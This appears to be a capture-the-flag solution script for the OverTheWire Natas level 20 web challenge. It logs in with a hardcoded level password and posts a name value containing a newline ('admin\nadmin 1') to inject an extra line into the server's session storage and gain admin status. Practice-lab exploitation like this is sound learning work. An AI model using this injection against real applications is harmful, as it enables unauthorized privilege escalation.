import requests

username = "natas20"
password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/?debug=true".format(username)

response = session.post(
    url, data={"name": "admin\nadmin 1"}, auth=(username, password))
content = response.text
print(content)

print("\n\n")

response = session.get(url, auth=(username, password))
content = response.text
print(content)
